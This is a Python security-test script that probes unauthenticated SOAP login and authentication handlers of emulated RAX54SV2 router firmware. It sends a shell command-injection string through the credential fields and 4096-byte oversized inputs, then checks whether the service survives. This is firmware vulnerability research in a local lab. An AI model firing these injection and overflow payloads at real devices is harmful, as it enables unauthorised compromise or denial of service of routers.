#!/usr/bin/env python3
"""Bounded checks for every credential-processing unauthenticated SOAP handler."""

from __future__ import annotations

import json
from pathlib import Path

import probe_rax54sv2_http_security as probe
from audit_rax54sv2_sensitive_soap import request


ROOT = Path(__file__).resolve().parents[1]
OUTPUT = (
    ROOT
    / "known_firmware/emulation/RAX54SV2/full-system-http-lab/"
    "unauth-credential-soap-matrix.json"
)


def send(service: str, action: str, arguments: str) -> dict[str, object]:
    try:
        response = probe.exchange(
            "127.0.0.1", 25156, request(service, action, arguments), timeout=15
        )
        return {
            "service": service,
            "action": action,
            "argument_bytes": len(arguments),
            "http_status": probe.status(response),
            "response_bytes": len(response.partition(b"\r\n\r\n")[2]),
            "service_alive": probe.alive("127.0.0.1", 25156),
        }
    except OSError as error:
        return {
            "service": service,
            "action": action,
            "argument_bytes": len(arguments),
            "error": f"{type(error).__name__}: {error}",
            "service_alive": probe.alive("127.0.0.1", 25156),
        }


def main() -> int:
    probe.USE_TLS = True
    marker = "$(touch${IFS}/tmp/FRIDAY_RAX54SV2_UNAUTH_MARKER)"
    cases = [
        (
            "DeviceConfig",
            "SOAPLogin",
            "<NewUsername>x</NewUsername><NewPassword>x</NewPassword>",
        ),
        (
            "DeviceConfig",
            "SOAPLogin",
            f"<NewUsername>{marker}</NewUsername>"
            f"<NewPassword>{marker}</NewPassword>",
        ),
        (
            "DeviceConfig",
            "SOAPLogin",
            f"<NewUsername>{'U' * 4096}</NewUsername>"
            f"<NewPassword>{'P' * 4096}</NewPassword>",
        ),
        ("DeviceConfig", "SOAPLogout", ""),
        (
            "ParentalControl",
            "Authenticate",
            "<NewUsername>x</NewUsername><NewPassword>x</NewPassword>"
            "<ModelType>0</ModelType>",
        ),
        (
            "ParentalControl",
            "Authenticate",
            f"<NewUsername>{marker}</NewUsername>"
            f"<NewPassword>{marker}</NewPassword><ModelType>0</ModelType>",
        ),
        (
            "ParentalControl",
            "Authenticate",
            f"<NewUsername>{'U' * 4096}</NewUsername>"
            f"<NewPassword>{'P' * 4096}</NewPassword>"
            f"<ModelType>{'S' * 4096}</ModelType>",
        ),
    ]
    results = []
    for case in cases:
        result = send(*case)
        results.append(result)
        print(json.dumps(result), flush=True)
        if not result["service_alive"]:
            break
    OUTPUT.write_text(json.dumps(results, indent=2) + "\n")
    print(f"output={OUTPUT}")
    return 0 if results and results[-1]["service_alive"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
